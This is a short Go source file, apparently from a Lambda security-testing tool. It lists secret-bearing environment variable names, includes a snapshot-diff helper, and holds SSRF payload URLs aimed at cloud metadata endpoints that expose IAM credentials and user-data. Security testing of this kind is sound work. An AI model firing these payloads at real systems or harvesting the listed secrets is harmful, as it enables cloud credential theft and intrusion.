package lambda

import "fmt"

var commonLambdaEnvVars = []string{
	"DATABASE_PASSWORD",
	"DB_PASSWORD",
	"PRIVATE_KEY",
	"API_KEY",
	"SECRET_KEY",
	"AWS_SECRET_ACCESS_KEY",
	"RDS_PASSWORD",
	"MONGODB_URI",
	"REDIS_PASSWORD",
	"JWT_SECRET",
	"OAUTH_SECRET",
	"AUTH_TOKEN",
	"SLACK_BOT_TOKEN",
	"GITHUB_TOKEN",
	"SENDGRID_API_KEY",
	"STRIPE_API_KEY",
	"AWS_ACCESS_KEY_ID",
}

var commonSSRFPayloads = []string{
	"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
	"http://169.254.169.254/latest/meta-data/instance-id",
	"http://localhost:9001/",
	"http://127.0.0.1:9001/",
	"http://localhost:3000/admin",
	"http://127.0.0.1:3000/admin",
	"http://169.254.169.254/latest/user-data",
	"http://metadata.google.internal/computeMetadata/v1/?recursive=true",
}

func diffSnapshots(pre, post map[string]interface{}) map[string]interface{} {
	diff := make(map[string]interface{})
	for k, preVal := range pre {
		postVal, exists := post[k]
		if !exists {
			diff[k] = fmt.Sprintf("%v → (removed)", preVal)
		} else if fmt.Sprintf("%v", preVal) != fmt.Sprintf("%v", postVal) {
			diff[k] = fmt.Sprintf("%v → %v", preVal, postVal)
		}
	}
	// catch new keys in post
	for k, postVal := range post {
		if _, exists := pre[k]; !exists {
			diff[k] = fmt.Sprintf("(new) → %v", postVal)
		}
	}
	return diff
}
